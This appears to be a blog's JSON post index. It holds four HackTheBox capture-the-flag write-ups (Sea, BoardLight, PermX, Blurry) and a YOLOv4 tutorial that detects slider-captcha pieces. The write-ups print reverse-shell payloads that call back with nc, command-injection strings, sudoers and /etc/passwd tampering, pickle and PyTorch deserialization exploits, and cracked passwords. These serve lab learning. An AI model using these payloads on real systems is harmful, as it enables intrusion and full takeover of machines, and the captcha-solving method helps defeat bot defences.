[
  
    {
      "title"    : "[WriteUp] HackTheBox - Sea",
      "category" : "",
      "tags"     : "WriteUp and Hack The Box",
      "url"      : "/2024/08/26/writeup-hackthebox-sea/",
      "date"     : "Aug 26, 2024",
      "content"  : "Sea is a simple box from HackTheBox’s Season 6 of 2024.EnumerationAs usual, the Nmap scan shows open ports 22 and 80.We always know that SSH won’t be the first choice,so let’s check out the web service first.We browse through each page of the web service but find nothing special.  web pageThe only page that stands out is “contact.php”, which has a form.Our instinct tells us that the Website field might be vulnerable to XSS or CSRF attacks.  web page: /contact.phpWe scan all possible directories, starting from the root directory.  dirsearch scan: /The root directory scan show four subdirectories:  data  messages  plugins  themesLet’s scan these four directories and their subdirectories.  dirsearch scan: /data  dirsearch scan: /plugins &amp;amp; /messages  dirsearch scan: /themesSome interesting information appears under the “/themes/bike” directory.“/themes/bike/summary” exposes the theme used by this CMS.  web page: /themes/bike/summary“/themes/bike/version” reveals the theme version used by the CMS.  web page: /themes/bike/version“/themes/bike/LICENSE” exposes the CMS’s copyright information,including the author’s name.  web page: /themes/bike/LICENSEFootholdWe search for this information on GitHub and eventually identify the likely CMS through the author’s name.  github search resultWe suspect the CMS used here is “Wonder CMS”.Let’s see if there’s an exploit script available for it.  github search resultLuckily, we find a CVE that matches the version number: CVE-2023-41425This is an exploit script that use an XSS vulnerability to achieve RCE.By examining the source code,we infer that there might be a link like “/index.php?page=loginURL”.  exploit source codeLet’s visit this link.Yes, it exists, confirming our suspicion that the web service indeed uses “Wonder CMS”.  web page: /index.php?page=loginURLSo, download and execute the exploit script.python3 exploit.py -u http://sea.htb/loginURL -i &amp;lt;your_ip&amp;gt; -p &amp;lt;your_port&amp;gt; -r http://&amp;lt;your_ip&amp;gt;:8000/main.zip  run exploit scriptEnter the link provided by “Send the below link to admin” in the suspected location.Like this.Submit the form and wait a moment.Yes! It worked.  www-data shellWe obtained a “www-data” user shell.Privilege EscalationAs we know, the “www-data” user has very limited permissions.We need to escalate privileges.Let’s explore the web file directory “/var/www/” to look for sensitive information.  check web filesThe file “/var/www/data/database.js” caught my attention.  check database.jsDo you see the “password” hash? That might be the breakthrough.Copy the hash locally and use “John” to brute-force it.  crack password hashWe got a password!mychemicalromanceCheck which users are allowed to log in.  check passwd fileBesides the root user, “amay” or “geo” might be able to login.Try login by “amay”.  user shellWe obtain a shell with user privileges!Next, we need to escalate to root.Let’s check sudo first.  check sudoThe current user amay cannot use the sudo command.Upload linpeas.sh for a comprehensive enumeration.  SUID/SGID filesCross-reference the SUID/SGID information with GTFObin,but nothing useful turns up for now.But the open ports reveal something interesting,including ports 8080 and 37309.  active portsCheck out port 8080, it’s also a web service.It requires authentication, we can reuse amay’s username and password.  other webTo make it easier to inspect through the browser,we forward port 8080 on the remote machine to port 8080 on our local machine.ssh -v -N -L 8080:localhost:8080 amay@sea.htbThen access it via the browser, it’s a system monitoring panel.  other web pageThe “Analyze Log File” feature allows access to log files with root permissions.After some testing,we find that modifying the “log_file” parameter enables arbitrary file reading.  test log_file  result of test log_fileFurther testing the “log_file” parameter with BurpSuite.  test sepThe parameter value can’t end with a “;” symbol.  test sepBut it can end with “+#” (where “+” is URL-encoded as a space).Test modifying the parameter value to point to two different file paths./etc/passwd+/etc/hosts+#It still works, leading us to suspect that the web application might be using a tool like “cat” to read files.  test double fileTest again,modifying the parameter value to include a command injection./etc/passwd+%26%26+id+#  test command injectThe command injection was successful.OK, let’s modify the payload to execute a reverse shell./etc/passwd+%26%26+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.5%2014444%20%3E%2Ftmp%2Ff%3Bsleep+60+#  try get shellIt worked, but the connection dropped shortly after.We might need another method to gain a persistent root session.I have a new idea: “Give amay sudo privileges”.Update the payload to modify the sudoers file./etc/passwd+%26%26+echo+&quot;amay+ALL=(ALL)+NOPASSWD:+ALL&quot;+&amp;gt;+/etc/sudoers.d/amay+#  try edit sudoerThe amay user executes the sudo command, it worked!This is the final step: we obtain a root shell through the sudo command!  root shell:)",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/08/26/writeup-hackthebox-sea/'> <img src='/images/cover/02.jpg' alt='[WriteUp] HackTheBox - Sea'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>5 min read <time class='article__date' datetime='2024-08-26T15:21:00+08:00'>Aug 26, 2024</time> </span> </div><h2 class='article__title'>[WriteUp] HackTheBox - Sea</h2> <p class='article__excerpt'>Sea is a simple box from HackTheBox, Season 6 of 2024.</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/WriteUp' class='article__tag'>WriteUp</a>  <a href='/tag/Hack The Box' class='article__tag'>Hack The Box</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "[WriteUp] HackTheBox - BoardLight",
      "category" : "",
      "tags"     : "WriteUp and Hack The Box",
      "url"      : "/2024/08/02/writeup-hackthebox-boardlight/",
      "date"     : "Aug 2, 2024",
      "content"  : "BoardLight is a simple difficulty box on HackTheBox.EnumerationAs always, let’s start with enumeration.  Nmap scanThe familiar Nmap scan report shows open ports 22 and 80.Port 80 is for the web service, which redirects to the domain “board.htb”,so we need to configure the hosts file first.Checked every page, but found no special information.  web pageAttempted to enumerate subdomains using ffuf.ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://board.htb/ -H &quot;Host: FUZZ.board.htb&quot;Discovered the subdomain “crm.board.htb”.Added this domain to the hosts file as well.  ffuf scanAccessed the web service through a browser, and it’s a CMS login panel.  web pageThe page information revealed that the current web application is Dolibarr,with the detailed version number 17.0.0.FootholdYes, Google!By searching for Dolibarr-related vulnerabilities on Google,found the vulnerability for the corresponding version: CVE-2023-30253.  google search resultBut the information about this vulnerability tells us it requires authentication,we need an account and password.  CVE information  exploit codeContinued to Google, looking for Dolibarr’s default account and password.  google search resultDolibarr’s default account and password are the same, both “admin”.  loginLogged in successfully.Downloaded the exploit script and ran it.  get the shellOK, we have a www-data shell!Privilege EscalationAs usual, uploaded linpeas.sh and used it to gather information.  active  portsPort 3306 is open, which is the default port for MySQL,meaning the backend should be using MySQL as the database.Continued to Google to find out where Dolibarr’s database configuration is set.  google search resultLocated it through the variable dolibarr_main_db_host.  dolibarr srouce codeThe configuration is in the file “htdocs/conf/conf.php”.  conf.phpObtained the MySQL account password and database name.dolibarrowner  serverfun2$2023!!  After looking at MySQL for a while, I realized I was going down a rabbit hole…Fuxk! It’s password reuse!Using the password “serverfun2$2023!!”,I logged into the low-privilege account larissa.  user shellUsed linpeas.sh again to gather information.  SUID FileFound many unknown SUID programs.Googled each one.enlightenment have a CVE number: CVE-2022-37706.  google search resultDownloaded the exploit script and executed the exploit.  root shellGot a root shell!Well done!",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/08/02/writeup-hackthebox-boardlight/'> <img src='/images/cover/09.jpg' alt='[WriteUp] HackTheBox - BoardLight'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>2 min read <time class='article__date' datetime='2024-08-02T14:19:00+08:00'>Aug 2, 2024</time> </span> </div><h2 class='article__title'>[WriteUp] HackTheBox - BoardLight</h2> <p class='article__excerpt'>BoardLight is a simple difficulty box on HackTheBox.  </p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/WriteUp' class='article__tag'>WriteUp</a>  <a href='/tag/Hack The Box' class='article__tag'>Hack The Box</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "[WriteUp] HackTheBox - PermX",
      "category" : "",
      "tags"     : "WriteUp and Hack The Box",
      "url"      : "/2024/07/18/writeup-hackthebox-permx/",
      "date"     : "Jul 18, 2024",
      "content"  : "PermX is a simple-difficulty box from HackTheBox 2024 Season 5.EnumerationLet’s start with enumeration.  Nmap scanThe Nmap scan report shows open ports 22 and 80.Port 80 is for the web service, which redirects to the domain “permx.htb”,So we need to configure the hosts file first.Accessing the web service through a browser,didn’t reveal any useful information for now.  web pageDirectory enumeration on the web service was similarly disappointing.  dirsearch scanTried using ffuf to enumerate subdomains.  ffuf scanNice! Discovered the subdomain “lms.permx.htb”.Add this domain to the hosts file as well.The web page is a login panel.  web pageDirectory enumeration again.  dirsearch scanReview interesting directories from the robots.txt file.  robots.txtExamining these directories one by one.found that the “/documentation/changelog.html” page,the detailed version number of the current web application: Chamilo 1.11.24.  information disclosureFootholdGoogle search for Chamilo vulnerabilities,we found an RCE vulnerability for this version: CVE-2023-4220.  google search resultThe exploit script can be found on Github:https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-pocUse nc to listen and execute this exploit script to gain a reverse shell.python3 main.py -u http://lms.permx.htb -a revshell  set opetions and waiting exploit comleted  get the shellWe have a shell!However, since the www-data user’s permissions are very limited,we need a privilege escalation.As usual, upload linpeas.sh and use it to gather information.  users  password dsclosure  another password dsclosureThe information collected includes two leaked passwords:gaufrette  03F6lY3uXAP2bkW8  Using the password “03F6lY3uXAP2bkW8” for SSH login, Successfully login as mtz.  user shellobtaining a user shell.Privilege EscalationThe next goal is root privileges.As usual, checking the SUDO information frist.  sudo -lThe terminal output shows that the current user is allowed to run the ‘/opt/acl.sh’ file with sudo without a password.Next, inspect the acl.sh file.#!/bin/bashif [ &quot;$#&quot; -ne 3 ]; then   /usr/bin/echo &quot;Usage: $0 user perm file&quot;   exit 1fiuser=&quot;$1&quot;perm=&quot;$2&quot;target=&quot;$3&quot;if [[ &quot;$target&quot; != /home/mtz/* || &quot;$target&quot; == *..* ]]; then   /usr/bin/echo &quot;Access denied.&quot;   exit 1fi# Check if the path is a fileif [ ! -f &quot;$target&quot; ]; then   /usr/bin/echo &quot;Target must be a file.&quot;   exit 1fi/usr/bin/sudo /usr/bin/setfacl -m u:&quot;$user&quot;:&quot;$perm&quot; &quot;$target&quot;The script’s logic involves using setfacl to set rwx permissions on a specified file for a given user, But there are filtering conditions on the file path (the third parameter):  The file path must be under “/home/mtz”  The file path cannot contain directory traversal symbols “..”OK, now let’s try to get a root privilege shell.My plan is to create a symbolic link to the “/etc/passwd” file in the “/home/mtz” directory, then edit the passwd file to add a privileged user.Generates a password HASH.  generate passwd hashUse the following commands to escalate privileges.ln -s /etc/passwd passwdsudo /opt/acl.sh mtz rwx /home/mtz/tmp/passwdecho &#39;b0rgch3n:$1$zrd0hGa7$xs1GPMR4gl1lZE1lJwQt81:0:0:root:/root:/bin/bash&#39; &amp;gt;&amp;gt; /home/mtz/tmp/passwdCheck the passwd file to confirm the privileged account has been added.  check passwd fileLogin with the privileged account.  root shellGain a root privilege shell.Cheers!",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/07/18/writeup-hackthebox-permx/'> <img src='/images/cover/10.jpg' alt='[WriteUp] HackTheBox - PermX'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>3 min read <time class='article__date' datetime='2024-07-18T03:34:00+08:00'>Jul 18, 2024</time> </span> </div><h2 class='article__title'>[WriteUp] HackTheBox - PermX</h2> <p class='article__excerpt'>PermX is a simple-difficulty box from HackTheBox 2024 Season 5.</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/WriteUp' class='article__tag'>WriteUp</a>  <a href='/tag/Hack The Box' class='article__tag'>Hack The Box</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "[WriteUp] HackTheBox - Blurry",
      "category" : "",
      "tags"     : "WriteUp and Hack The Box",
      "url"      : "/2024/06/13/writeup-hackthebox-blurry/",
      "date"     : "Jun 13, 2024",
      "content"  : "Blurry is a medium-difficulty box in the fifth season of HackTheBox in 2024.EnumerationLet’s start by enumerating.  Nmap scanThe Nmap scan report shows open ports 22 and 80.Port 80 is a web service and redirects to the domain “app.blurry.htb”.So, You need to configure the hosts file first.Since there is a web service, we should enumerate the directories.  dirsearch scanAlso, when accessing the web service through a browser,the page information indicates that the service is ClearML.  brower accessFootholdFound a ClearML-related vulnerability through Google search: CVE-2024-24590.All information about this vulnerability points to this article, which includes a detailed demonstration of how the vulnerability can be exploited:“Machine Learning Operations: What You Need to Know Now - HiddenLayer”First, install ClearML.Then, go to the settings page of the web service and copy the configuration information.The configuration information involves three addresses in the ClearML initialization settings: web_server, api_server, and files_server.We need to configure the hosts file to add the DNS entries for these three domains.10.10.11.19 app.blurry.htb\t# web_server10.10.11.19 api.blurry.htb\t# api_server10.10.11.19 files.blurry.htb\t# files_serverInitialize the ClearML configuration with the “clearml-init” command and paste the copied content.From observation, the account Black Swan repeats the “Review JSON Artifacts” task every so often.The task’s code contains the deserialization code needed to trigger the vulnerability.After a detailed code review, we can understand its logic roughly as follows:  Check all tasks with project_name “Black Swan” and tags [‘review’].  Iterate through these tasks and call artifact.get() for deserialization.  Destroy these tasks after the iteration.Based on the code audit results,we need to ensure consistency in the project_name and tags when testing with the PoC code.from clearml import Taskimport pickle, osclass RunCommand:    def __reduce__(self):        # Payload        return (os.system, (&#39;echo Hacked by b0rg | nc 10.10.14.19 14443&#39;,))command = RunCommand()project_name = &#39;Black Swan&#39;task_name = &#39;TestNotMatchTaskName&#39;tags = [&#39;review&#39;]task = Task.init(project_name, task_name, tags)task.upload_artifact(name=&#39;pickle_artifact&#39;, artifact_object=command, retries=2, wait_on_upload=True, extension_name=&#39;.pkl&#39;)Use nc to listen and execute the PoC code.After waiting for Black Swan to repeat the “Review JSON Artifacts” task, we will see message echoing in the terminal.Modify the Payload to turn the PoC code into Exploit code.nc -c bash 10.10.14.19 14443Again, listen using nc, and execute the exploit code to gain user permissions and obtain a reverse shell.Privilege EscalationUse linpeas.sh for enumeration and collect information related to privilege escalation.The scan results show that the current user has an SSH private key, which can be used for persistent access.Another interesting piece of information is that the current user has NOPASSWD sudo access.Let’s take a look at the source code of evaluate_model,we can see that evaluate_model actually calls the “/models/evaluate_model.py” file.Looking at the source code of evaluate_model.py,we can see that there is a step for loading the model,which leads us to anticipate the presence of a deserialization vulnerability.By constructing malicious model code,we can generate a custom pth file containing a reverse shell.import torchimport torch.nn as nnimport torch.nn.functional as Fimport osclass Net(nn.Module):    def __init__(self):        super(Net, self).__init__()        self.layer1 = nn.Linear(1, 128)        self.layer2 = nn.Linear(128, 128)        self.layer3 = nn.Linear(128, 2)    def forward(self, x):        x = F.relu(self.layer1(x))        x = F.relu(self.layer2(x))        action = self.layer3(x)        return action    def __reduce__(self):        return (os.system, (&#39;nc -c bash 10.10.14.19 14443&#39;,))if __name__ == &#39;__main__&#39;:    n = Net()    torch.save(n, &#39;getshell.pth&#39;)Upload this code to the machine and execute it to generate the getshell.pth file.Then, listen using nc, and execute the NOPASSWD sudo exploit.Gain administrator privileges.Nice!",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/06/13/writeup-hackthebox-blurry/'> <img src='/images/cover/11.jpg' alt='[WriteUp] HackTheBox - Blurry'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>6 min read <time class='article__date' datetime='2024-06-13T16:01:35+08:00'>Jun 13, 2024</time> </span> </div><h2 class='article__title'>[WriteUp] HackTheBox - Blurry</h2> <p class='article__excerpt'>Blurry is a medium-difficulty box from HackTheBox 2024 Season 5.</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/WriteUp' class='article__tag'>WriteUp</a>  <a href='/tag/Hack The Box' class='article__tag'>Hack The Box</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "[Solutions] Object Detection 0 to 0.01: YOLOv4",
      "category" : "",
      "tags"     : "Solutions, Object Detection, YOLO, and DNN",
      "url"      : "/2021/03/19/solutions-object-detection-0-to-001-yolov4/",
      "date"     : "Mar 19, 2021",
      "content"  : "The object recognition solution: YOLOv4.IntroductionSince achieving image text recognition through CNN in 2019, my study and practice of neural networks have stagnated for a long time.So this time, I aim for a slightly more challenging target with object recognition: letting the neural network find something in the images.The object recognition solution is actually quite simple: YOLOv4.Requirement  Open source project: darknet - YOLOv4  Annotation tool: labelImg  Reference: How to train (to detect your custom objects)Sample PreparationFor the experiment, I chose to use a slider captcha developed by a well-known Chinese internet company for demonstration, because sliders are easy to recognize as targets.Traditional image processing (like Pillow) does not work well for slider captcha recognition.Randomly select a type of slider captcha and download its background images in bulk.The selected samples for the current experiment have various situations, but the ultimate goal is to find all slider positions in the images.  slide captcha background imagesThe annotation of the images is roughly as follows.  annotate object by labelImgThe annotated information will be stored in .txt files in YOLO format.  annotation object dataData PreprocessingFirst, understand the data-related files,which can be divided into 6 categories, all stored in the “darknet\\data” directory.  Image samples containing objects (.\\obj\\xxx.jpg)  Object annotation data corresponding to image samples (.\\obj\\xxx.txt)          Text files with the same name as the image samples in the same folder        Collection of training data paths (train.txt)  Collection of prediction data paths (test.txt)  Object classification (obj.names)  Input data configuration (obj.data)Object classification (obj.names)Object classification is a text file,with each line corresponding to a category name, and the line number being the index.targetImage Samples &amp;amp; Annotation Data (.\\obj\\xxx.&amp;lt;jpg|txt&amp;gt;)Each .jpg image sample can contain multiple inspection objects, and the corresponding annotation data file .txt will also contain the same number of inspection objects.Each .jpg image sample corresponds to an annotation data .txt file stored in the same directory.The annotation data format is one detection object per line:  The class index  The midpoint of the bounding box on the x and y axes  The width and height of the bounding box  annotation object format1 0.716797 0.395833 0.216406 0.1472221 0.420312 0.395833 0.140625 0.166667The YOLO format sample data generated by labelImg needs to be converted to the above format.For specific preprocessing, refer to “How to train (to detect your custom objects)” point 5.  yolov4 documentBatch conversion can be achieved by modifying the official example script “/scripts/voc_label.py”.The final files in the obj directory should look roughly like this:  obj directoryTrain &amp;amp; Test Set Path Collection (train.txt &amp;amp; test.txt)According to the official guide,the dataset is divided into training and testing sets in a certain proportion,and the relative paths of the images are stored in the train.txt and test.txt files.  train.txt  test.txtInput Data Configuration (obj.data)Indicates model data set related information:  classes: The number of object categories  train: The location of the train set path files  test: The location of the test set path files  names: The location of the object classification file  backup: The output path location  obj.dataModify ConfigurationThe related configuration files are all stored in the “darknet\\cfg” directory.Network structure definition file “yolov4-obj.cfg”.For details on modifying the hyperparameters,refer to “How to train (to detect your custom objects)” point 1.  yolov4 documentIn the configuration directory,copy “yolov4-custom.cfg” to “yolov4-obj.cfg” and modify the configuration part:  batch: the number of small batches (can be adjusted according to GPU memory)  subdivisions: further subdivision of each small batch  max_batches: the maximum number of small batches for training          the training stops once this number is exceeded      Usually set to classes * 2000 and cannot be less than the number of image samples        steps and scales: related to learning rate adjustment          Steps: Usually set to 80%~90% of max_batches      Scales: Usually, no need to adjust        width and height: set the size of the network input          Generally set to be consistent with the image samples, or any multiple of 32        classes: set the number of categories          Must be consistently modified for all [yolo] layers      Must be consistent with the sample target detection count        filters: set the number of convolutional kernels in specific locations          Must be set for the [convolutional] layer connected to the [yolo] layer      Must be set to (classes + 5) * 3      batch=64subdivisions=16max_batches=2000steps=1600, 1800scales=.1,.1... ...Pre-trained Weight FilesThe related files for pre-training are stored in the “darknet\\weight” directory, Pre-trained weight file (yolov4.conv.137).Each network has a corresponding pre-trained convolutional layer weight file.Refer to “How to train (to detect your custom objects)” point 7 for which file to download.  yolov4 documentFor this experiment, using the YOLOv4 network, download the corresponding pre-trained weight file “yolov4.conv.137”.Training the ModelRefer to ““How to train (to detect your custom objects)” points 8 and 9 for model training.For multi-GPU training, refer to “How to train with multi-GPU”.darknet.exe detector train data/obj.data yolo-obj.cfg yolov4.conv.137Training ResultsAll .weights weight files output after training are stored in the backup directory.Because the training process archives the weight file at each stage, the directory contains multiple weight files, generally archived once every 1k iterations.A very important point to note here:When using the model in a production environment, only the best weight file is needed.The selection of the weight file is not based on the highest iteration count but on the highest mAP (mean average precision) or IoU (intersect over union) values.For the specific reason, see “When should I stop training” point 2.2.For example,compare the weight files archived at each stage between 1k and 5k iterations:darknet.exe detector map data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_1000.weights  1k iterationsdarknet.exe detector map data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_2000.weights  2k iterationsdarknet.exe detector map data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_3000.weights  3k iterationsdarknet.exe detector map data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_4000.weights  4k iterationsdarknet.exe detector map data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_5000.weights  5k iterationsIt can be seen that the highest mAP and IoU values are at 4k iterations, not at 5k iterations.Testing the ModelRefer to “How to use on the command line” for model testing.the command format is roughly as follows:darknet.exe detector &amp;lt;train/test/valid/demo/map&amp;gt; &amp;lt;data&amp;gt; &amp;lt;cfg&amp;gt; &amp;lt;weights (optional)&amp;gt; [-ext_output &amp;lt;ext&amp;gt;]Verify the results on the test set.darknet.exe detector valid data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_last.weightsDemonstrate the object detection effect of the model on images.darknet.exe detector test data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_last.weights -ext_output data\\0967f9db79f4462197bed6565a17ed63.jpg  detect resultDemonstrate the object detection effect of the model on videos.darknet.exe detector demo data\\obj.data cfg\\yolov4-custom.cfg backup\\yolov4-custom_last.weights -ext_output data\\test.mp4 detect result (videos)It’s cool :)StatementThe purpose of this experiment is solely to reproduce custom single-class object detection using YOLOv4.",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/03/19/solutions-object-detection-0-to-001-yolov4/'> <img src='/images/cover/12.jpg' alt='[Solutions] Object Detection 0 to 0.01: YOLOv4'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>7 min read <time class='article__date' datetime='2021-03-19T03:07:00+08:00'>Mar 19, 2021</time> </span> </div><h2 class='article__title'>[Solutions] Object Detection 0 to 0.01: YOLOv4</h2> <p class='article__excerpt'>Letting the neural network find something in the images.</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/Solutions' class='article__tag'>Solutions</a>  <a href='/tag/Object Detection' class='article__tag'>Object Detection</a>  <a href='/tag/YOLO' class='article__tag'>YOLO</a>  <a href='/tag/DNN' class='article__tag'>DNN</a> </span></div></div></div></div></div>"
    } 
  
]
